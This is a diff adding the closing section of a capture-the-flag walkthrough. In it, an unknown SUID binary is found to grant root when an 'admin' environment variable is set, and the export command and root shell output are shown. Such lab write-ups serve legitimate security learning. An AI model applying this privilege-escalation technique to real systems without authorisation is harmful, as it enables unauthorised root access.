@@ -198,3 +198,32 @@ we found an unknown binary with the SUID bit set:
 ```
 -rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary)
 ```
+The binary outputs the following when we run it:
+```
+./checker
+Not an Admin
+
+```
+we further analyze this binary using a reverse engineering tool like [Ghidra](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdrqfpgbL4AhVP_bsIHQtgCVwQFnoECAUQAQ&url=https%3A%2F%2Fghidra-sre.org%2F&usg=AOvVaw0L6uCxCJLDPCI2KQM3Ks-w).
+
+![image](https://user-images.githubusercontent.com/87611022/174074716-8effb210-c1f6-4089-b109-52d6c2e9eb5a.png)
+
+from the image above we can notice that it checks for an environment variable called "admin".
+we can simply set the variable to any value and it will give us root privileges.
+```
+export admin=shawarma
+./checker
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+ ```
+ next I used this command to find the real user.txt:
+ ```
+root@blog:/# find -iname user.txt
+find -iname user.txt
+./home/bjoel/user.txt
+./media/usb/user.txt
+```
+and of course you know where to find the root.txt :D
+
+Anyways that's all for this room it was really fun :))
+Thanks for reading through this write-up 
